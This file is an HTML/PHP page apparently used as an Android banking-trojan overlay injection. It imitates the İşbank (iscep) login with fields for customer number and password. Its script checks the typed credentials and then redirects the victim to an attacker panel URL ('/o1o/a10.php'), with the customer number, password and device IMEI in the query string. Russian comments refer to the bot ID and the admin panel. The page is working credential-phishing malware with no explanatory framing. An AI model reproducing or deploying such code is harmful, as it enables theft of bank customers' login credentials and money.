<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Pozitron</title>
    <style>
        body {
            font-family: Verdana, Arial, sans-serif;
            font-size: 14px;
            line-height: 1.5;
            color: #333;
            overflow: auto;
            min-height: 10%;
            background: #fff;
			margin: 0px;
			padding: 0px;
        }

input {
    width: 96%;
    font-size: 12px;
    line-height: 18px;
    color: #333;
    padding: 5px 16px;
    border: 0;
    border-bottom: 2px solid #e3e3e3;
    height: 32px;
    display: block;
    margin: 8px 0 0;
    vertical-align: middle;
}

input.submit-button {
    width: 96%;
    font-size: 18px;
    line-height: 18px;
    color: #fff;
    padding: 5px 16px;
    border: 1px solid #f74a14;
    background-color: #ff5723;
    height: 40px;
    display: inline-block;
    margin: 8px 0 0;
    vertical-align: middle;
}

        .form-row label {
            display: block;
            float: left;
            font-weight: normal;
            width: 15%;
            margin: 6px 0px 0px;
            font-size: 12px;
            line-height: 18px;
            color: #FFF;
        }

        input[type="text"]:focus {
            border-color: #FC3;
            outline: 0 none;
        }

        input[type="password"]:focus {
            border-color: #FC3;
            outline: 0 none;
        }

        .fielderror {

            border: 1px solid #f00;

        }

        #logo {
            text-align: center;
			padding: 10px;
			background: #002567;
        }
    </style>
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

<div id="content_div">
    <div id="logo">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPoAAABWCAMAAADR7HuaAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABa1BMVEX///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8xWP+lAAAAeHRSTlMAfMW2I9ky0j/mF5WaBSi7i1bjn51dYMNuz0nV3+3KZW0ZzTgSBLGD+i2kCQvet64cB2wzAR4NcgYkpwp3qXFnxurkx/UTYkScmK2R6LlIge8QNL/nLzqbQX6w2FyrQyAlRz08OTs3KyEUFhgODxURHycsMBsDCErMWpsKAAAAAWJLR0QAiAUdSAAABudJREFUeNrtm/1/GkUQh5fjJXAk2QOO2CAJEIgeGKStArYB+2JqrdVq1dbW+t7WWk1b390/39nZ3bvloClp+2Fj7r4/cG/L7jy3s7Nze0BIrFixYsWKFStWrFixYsWKFSushJVMmbbBjNIMlDFthQllODlbMm2GCWURPWfaDBOyET1v2gwjWo6qv4NWVldNmxBrsbJoEmU5pi1ZuApFDHOsFMGsRkR417QZRoToZdNWGFChjOhrpu1YtFZK6VdOrGOvJypwTCNzB1LrrxYIqXL0gsM23E1WM23SglQX6WtVOHxjCzYRQW+ydAs221U11qODnmOv8c22H+YKRxPd9j9eluBh9fVJdHIkx3qaJXk3WXMVrjGv/exSnWn0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">
    </div>

    <form action="null" method="post" id="_mainForm" target="flow_handler">
        <div class="form-row"><br>
            <div class="input">
                <label for="id" style="color: #8e8d8d;    margin: 3px 0px 0px 20px;"><b>Müşteri No</b></label><br><center>
                <input class="input" id="id" name="Müşteri No" tabindex="1" value="" maxlength="12" type="text"></center>
                <script>
                document.getElementById('id').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
            </div>
        </div>

        <div class="form-row">
            <div class="input">
                <label for="password" style="color: #8e8d8d;    margin: 3px 0px 0px 20px;"><b>Şifre</b></label><br>
                <input type="hidden" name="name" value="IsBank"><center>
                <input class="input" id="password" name="Şifre" maxlength="12" value="" type="password"></center>
            </div>
        </div>
        <br />

        <div style="text-align: center">
            <input id="submitBtn1" type="button" class="submit-button" value="Giriş" tabindex="4" />
        </div>
    </form>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden; display:none"></iframe>
</div>

<script type="text/javascript">



				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                   /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');

					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;

                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};

					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота
*/

                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('id');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input';
						} catch(e){};

                        if (oNumInp.value.length < 9) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{4,6}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "iscep'+
					'", "musteri_no": "'+oNumInp.value+
					'", "sifre": "'+oCodeInp.value+'"}');

						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/

						var url='<?php echo $URL; ?>';
						var imei_c='<?php echo $IMEI_country; ?>';
						document.location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|iscep|"+oNumInp.value+"|"+oCodeInp.value+"|");

						return false;
                    };

                })();
            </script>

</body>
</html>
